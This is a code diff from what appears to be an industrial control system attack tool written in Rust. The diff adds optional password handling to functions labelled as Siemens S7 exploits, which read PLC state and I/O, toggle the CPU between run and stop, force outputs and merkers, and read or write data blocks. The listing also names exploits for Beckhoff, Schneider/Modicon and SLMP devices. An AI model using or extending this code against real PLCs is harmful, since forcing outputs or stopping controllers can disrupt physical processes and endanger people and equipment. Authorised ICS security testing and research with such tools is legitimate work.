@@ -61,14 +61,14 @@ fn exploits_for(vendor: &str) -> Vec<ExploitDef> {
             ExploitDef::with_input("Write Symbol (ADS)", "SymbolName=hexvalue"),
         ],
         "siemens" => vec![
-            ExploitDef::new("Read CPU State"),
-            ExploitDef::new("Read I/O (inputs/outputs/merkers)"),
-            ExploitDef::new("Toggle CPU State (run\u{2194}stop)"),
-            ExploitDef::with_input("Set Outputs", "01010101"),
-            ExploitDef::with_input("Set Merkers", "bits:offset"),
-            ExploitDef::new("List Data Blocks"),
-            ExploitDef::with_input("Read Data Block", "DB1:0:64"),
-            ExploitDef::with_input("Write Data Block", "DB1:0:deadbeef"),
+            ExploitDef::with_input("Read CPU State", "|pw=password"),
+            ExploitDef::with_input("Read I/O (inputs/outputs/merkers)", "|pw=password"),
+            ExploitDef::with_input("Toggle CPU State (run\u{2194}stop)", "|pw=password"),
+            ExploitDef::with_input("Set Outputs", "01010101[|pw=password]"),
+            ExploitDef::with_input("Set Merkers", "bits:offset[|pw=password]"),
+            ExploitDef::with_input("List Data Blocks", "|pw=password"),
+            ExploitDef::with_input("Read Data Block", "DB1:0:64[|pw=password]"),
+            ExploitDef::with_input("Write Data Block", "DB1:0:deadbeef[|pw=password]"),
         ],
         "schneider" | "modicon" => vec![
             ExploitDef::new("Flash LED"),
@@ -549,9 +549,9 @@ fn dispatch_exploit(
         ("beckhoff", 2) => exploit_beckhoff_state(ip, "config", &out),
         ("beckhoff", 3) => exploit_beckhoff_reboot(ip, &out),
         ("beckhoff", 4) => exploit_beckhoff_adduser(ip, input, &out),
-        ("siemens", 0) => exploit_siemens_cpu(ip, &out),
-        ("siemens", 1) => exploit_siemens_io(ip, &out),
-        ("siemens", 2) => exploit_siemens_toggle(ip, &out),
+        ("siemens", 0) => exploit_siemens_cpu(ip, input, &out),
+        ("siemens", 1) => exploit_siemens_io(ip, input, &out),
+        ("siemens", 2) => exploit_siemens_toggle(ip, input, &out),
         ("schneider", 0) | ("modicon", 0) => exploit_schneider_flash(ip, &out),
         ("schneider", 1) | ("modicon", 1) => exploit_schneider_hijack_info(ip, &out),
         ("schneider", 2) | ("modicon", 2) => exploit_schneider_action(ip, "stop", &out),
@@ -574,7 +574,7 @@ fn dispatch_exploit(
         ("beckhoff", 7) => exploit_beckhoff_symbols(ip, &out),
         ("siemens", 3) => exploit_siemens_set_outputs(ip, input, &out),
         ("siemens", 4) => exploit_siemens_set_merkers(ip, input, &out),
-        ("siemens", 5) => exploit_siemens_list_dbs(ip, &out),
+        ("siemens", 5) => exploit_siemens_list_dbs(ip, input, &out),
         ("siemens", 6) => exploit_siemens_read_db(ip, input, &out),
         ("schneider", 4) | ("modicon", 4) => exploit_modbus_holding(ip, input, &out),
         ("schneider", 5) | ("modicon", 5) => exploit_modbus_coils(ip, input, &out),
@@ -677,16 +677,18 @@ fn exploit_beckhoff_adduser(ip: &str, input: &str, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_siemens_cpu(ip: &str, out: &impl Fn(&str)) {
+fn exploit_siemens_cpu(ip: &str, input: &str, out: &impl Fn(&str)) {
+    let pw = input.split_once("|pw=").map(|(_, p)| p.trim());
     use crate::vendors::siemens::s7comm;
     out(&format!("[*] Reading CPU state from {ip}..."));
-    out(&format!("  CPU State: {}", s7comm::get_cpu_state(ip, 102, 5)));
+    out(&format!("  CPU State: {}", s7comm::get_cpu_state(ip, 102, 5, pw)));
 }
 
-fn exploit_siemens_io(ip: &str, out: &impl Fn(&str)) {
+fn exploit_siemens_io(ip: &str, input: &str, out: &impl Fn(&str)) {
+    let pw = input.split_once("|pw=").map(|(_, p)| p.trim());
     use crate::vendors::siemens::s7comm;
     out(&format!("[*] Reading I/O from {ip}..."));
-    let data = s7comm::read_all_data(ip, 102, 5);
+    let data = s7comm::read_all_data(ip, 102, 5, pw);
     let [hdr, sep] = io_header();
     let mut all_addrs: Vec<String> = Vec::new();
     let mut all_vals: Vec<String> = Vec::new();
@@ -729,11 +731,12 @@ fn exploit_siemens_io(ip: &str, out: &impl Fn(&str)) {
     save_and_diff(ip, "s7", &points, out);
 }
 
-fn exploit_siemens_toggle(ip: &str, out: &impl Fn(&str)) {
+fn exploit_siemens_toggle(ip: &str, input: &str, out: &impl Fn(&str)) {
+    let pw = input.split_once("|pw=").map(|(_, p)| p.trim());
     use crate::vendors::siemens::s7comm;
     out(&format!("[*] Toggling CPU state on {ip}..."));
     if s7comm::change_cpu_state(ip, 102, 5) {
-        out(&format!("[+] New state: {}", s7comm::get_cpu_state(ip, 102, 5)));
+        out(&format!("[+] New state: {}", s7comm::get_cpu_state(ip, 102, 5, pw)));
     } else {
         out("[-] Failed to toggle CPU state");
     }
@@ -1233,9 +1236,13 @@ fn exploit_beckhoff_symbols(ip: &str, out: &impl Fn(&str)) {
 // ─── New Siemens exploits ────────────────────────────────────────────────────
 
 fn exploit_siemens_set_outputs(ip: &str, input: &str, out: &impl Fn(&str)) {
+    let (args, pw) = match input.split_once("|pw=") {
+        Some((a, p)) => (a.trim(), Some(p.trim())),
+        None => (input.trim(), None),
+    };
     use crate::vendors::siemens::s7comm;
-    out(&format!("[*] Writing outputs '{input}' to {ip}..."));
-    if s7comm::set_outputs(ip, input, 102, 5) {
+    out(&format!("[*] Writing outputs '{args}' to {ip}..."));
+    if s7comm::set_outputs(ip, args, 102, 5, pw) {
         out("[+] Outputs written");
     } else {
         out("[-] Write failed");
@@ -1243,21 +1250,26 @@ fn exploit_siemens_set_outputs(ip: &str, input: &str, out: &impl Fn(&str)) {
 }
 
 fn exploit_siemens_set_merkers(ip: &str, input: &str, out: &impl Fn(&str)) {
+    let (args, pw) = match input.split_once("|pw=") {
+        Some((a, p)) => (a.trim(), Some(p.trim())),
+        None => (input.trim(), None),
+    };
     use crate::vendors::siemens::s7comm;
-    let (bits, offset_s) = input.split_once(':').unwrap_or((input, "0"));
+    let (bits, offset_s) = args.split_once(':').unwrap_or((args, "0"));
     let offset = offset_s.trim().parse::<u32>().unwrap_or(0);
     out(&format!("[*] Writing merkers '{bits}' at offset {offset} to {ip}..."));
-    if s7comm::set_merkers(ip, bits, offset, 102, 5) {
+    if s7comm::set_merkers(ip, bits, offset, 102, 5, pw) {
         out("[+] Merkers written");
     } else {
         out("[-] Write failed");
     }
 }
 
-fn exploit_siemens_list_dbs(ip: &str, out: &impl Fn(&str)) {
+fn exploit_siemens_list_dbs(ip: &str, input: &str, out: &impl Fn(&str)) {
+    let pw = input.split_once("|pw=").map(|(_, p)| p.trim());
     use crate::vendors::siemens::s7comm;
     out(&format!("[*] Scanning DB1..200 on {ip} (may take a moment)..."));
-    let blocks = s7comm::list_data_blocks(ip, 102, 5);
+    let blocks = s7comm::list_data_blocks(ip, 102, 5, pw);
     if blocks.is_empty() {
         out("[-] No readable data blocks found");
         return;
@@ -1271,15 +1283,19 @@ fn exploit_siemens_list_dbs(ip: &str, out: &impl Fn(&str)) {
 }
 
 fn exploit_siemens_read_db(ip: &str, input: &str, out: &impl Fn(&str)) {
+    let (args, pw) = match input.split_once("|pw=") {
+        Some((a, p)) => (a.trim(), Some(p.trim())),
+        None => (input.trim(), None),
+    };
     use crate::vendors::siemens::s7comm;
-    let parts: Vec<&str> = input.splitn(3, ':').collect();
+    let parts: Vec<&str> = args.splitn(3, ':').collect();
     let db_str = parts.first().copied().unwrap_or("DB1");
     let db_num = db_str.trim_start_matches(|c: char| c.is_alphabetic())
         .parse::<u16>().unwrap_or(1);
     let offset = parts.get(1).and_then(|s| s.parse::<u16>().ok()).unwrap_or(0);
     let length = parts.get(2).and_then(|s| s.parse::<u16>().ok()).unwrap_or(64).min(240);
     out(&format!("[*] Reading DB{db_num} offset={offset} len={length} from {ip}..."));
-    match s7comm::read_data_block(ip, db_num, offset, length, 102, 5) {
+    match s7comm::read_data_block(ip, db_num, offset, length, 102, 5, pw) {
         Ok(data) => {
             for line in hex_dump_lines(&data, offset) {
                 out(&line);
@@ -1612,8 +1628,12 @@ fn exploit_slmp_write_m(ip: &str, input: &str, out: &impl Fn(&str)) {
 // ─── Siemens DB write exploit ─────────────────────────────────────────────────
 
 fn exploit_siemens_write_db(ip: &str, input: &str, out: &impl Fn(&str)) {
+    let (args, pw) = match input.split_once("|pw=") {
+        Some((a, p)) => (a.trim(), Some(p.trim())),
+        None => (input.trim(), None),
+    };
     use crate::vendors::siemens::s7comm;
-    let parts: Vec<&str> = input.splitn(3, ':').collect();
+    let parts: Vec<&str> = args.splitn(3, ':').collect();
     let db_str = parts.first().copied().unwrap_or("DB1");
     let db_num = db_str.trim_start_matches(|c: char| c.is_alphabetic())
         .parse::<u16>().unwrap_or(1);
@@ -1623,11 +1643,11 @@ fn exploit_siemens_write_db(ip: &str, input: &str, out: &impl Fn(&str)) {
         .filter_map(|c| u8::from_str_radix(std::str::from_utf8(c).ok()?, 16).ok())
         .collect();
     if data.is_empty() {
-        out("[-] No data to write (format: DB1:offset:hexbytes)");
+        out("[-] No data to write (format: DB1:offset:hexbytes[|pw=password])");
         return;
     }
     out(&format!("[*] Writing {} byte(s) to DB{db_num}:{offset} on {ip}...", data.len()));
-    match s7comm::write_data_block(ip, db_num, offset, &data, 102, 5) {
+    match s7comm::write_data_block(ip, db_num, offset, &data, 102, 5, pw) {
         Ok(true) => out("[+] DB write acknowledged"),
         Ok(false) => out("[!] Write sent — PLC did not acknowledge"),
         Err(e) => out(&format!("[-] {e}")),
